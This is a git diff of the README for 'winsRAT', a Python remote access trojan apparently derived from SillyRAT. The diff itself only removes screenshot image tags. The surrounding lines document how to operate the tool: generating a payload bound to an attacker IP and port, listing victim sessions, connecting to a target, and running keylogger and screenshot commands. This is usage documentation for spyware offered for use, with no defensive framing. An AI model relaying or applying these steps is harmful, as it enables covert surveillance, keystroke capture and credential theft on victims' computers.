@@ -15,7 +15,7 @@ winsRAT is written entirely in Python, developed from SillyRAT. winsRAT is a RAT
 
 ### Features
 This image shows the features of the tool.
-<h6 align="center"><img src="/img/features.png"></h6>
+
 And others, stay tuned.
 
 ### High-level features
@@ -56,8 +56,6 @@ $ python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Down
 $ python3 server.py generate -a 192.168.1.100 -p 9001 -o  "C:\Users\1com3456\Downloads\winsrat"
 ```
 
-<h6 align="center"><img src="/img/generate.png"></h6>
-
 Replace your IP Address and Port on above commands. 
 
 ### Running Server
@@ -72,8 +70,6 @@ All the connections will be listed under **sessions** command:
 $ sessions
 ```
 
-<h6 align="center"><img src="/img/sessions.png"></h6>
-
 You can connect to you target session with **connect** command and launch one of available commands: 
 ```
 $ connect ID
@@ -81,8 +77,6 @@ $ keylogger on
 $ keylogger dump
 $ screenshot
 ```
-
-<h6 align="center"><img src="/img/kl_scr.png"></h6>
 
 ### Help
 Get a list of available commands: 
